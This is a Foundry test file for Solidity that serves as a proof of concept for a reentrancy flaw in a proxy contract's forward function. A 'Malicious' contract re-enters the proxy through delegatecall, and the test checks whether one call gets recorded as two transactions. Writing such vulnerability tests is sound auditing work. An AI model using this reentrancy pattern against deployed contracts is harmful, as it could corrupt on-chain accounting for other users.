// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/proxy.sol";

contract ProxyReentrancyTest is Test {
    Proxy public proxy;
    Malicious public attacker;
    address user = address(0x1);

    function setUp() public {
        // Deploy the vulnerable proxy
        proxy = new Proxy();
        // Deploy attacker contract with proxy's address
        attacker = new Malicious(address(proxy));
    }

    function testReentrancyAttack() public {
        console.log("--- BEFORE-Trigger ---");
        // Record initial transaction counts
        uint256 initialTotal = proxy.totalTransactions();
        uint256 initialUserCount = proxy.getUserStats(user);
        uint256 initialProxyCount = proxy.getUserStats(address(proxy));
        uint256 initialAttackerCount = proxy.getUserStats(address(attacker));

        console.log("Total transactions:", initialTotal);
        console.log("User transactions:", initialUserCount);
        console.log("Proxy address transactions:", initialProxyCount);
        console.log("Attacker address transactions:", initialAttackerCount);

        console.log("--- Trigger: Reentrancy Attack ---");
        // User triggers attack via the vulnerable forward function
        vm.prank(user);
        proxy.forward(address(attacker), abi.encodeWithSelector(Malicious.attack.selector));

        console.log("--- AFTER-Trigger ---");
        uint256 newTotal = proxy.totalTransactions();
        uint256 newUserCount = proxy.getUserStats(user);
        uint256 newProxyCount = proxy.getUserStats(address(proxy));
        uint256 newAttackerCount = proxy.getUserStats(address(attacker));

        console.log("Total transactions:", newTotal);
        console.log("User transactions:", newUserCount);
        console.log("Proxy address transactions:", newProxyCount);
        console.log("Attacker address transactions:", newAttackerCount);

        // Condition for vulnerability: total transactions increased by 2 with one call
        if (newTotal - initialTotal == 2) {
            console.log("Vulnerability Exists: Reentrancy attack increased transactions by 2, allowing double recording");
        } else {
            console.log("Vulnerability not Exist: Total transactions increased by %d, expected 2", newTotal - initialTotal);
        }
    }
}

contract Malicious {
    address public immutable proxyAddress;
    address public immutable self;

    constructor(address _proxyAddress) {
        proxyAddress = _proxyAddress;
        self = address(this); // Stores contract's own address
    }

    // Attack function called via delegatecall
    function attack() external {
        // Reenter proxy to call safeFunction
        Proxy(proxyAddress).forward(self, abi.encodeWithSelector(Malicious.safeFunction.selector));
    }

    // Safe function to avoid infinite loop
    function safeFunction() external {
        // Do nothing
    }
}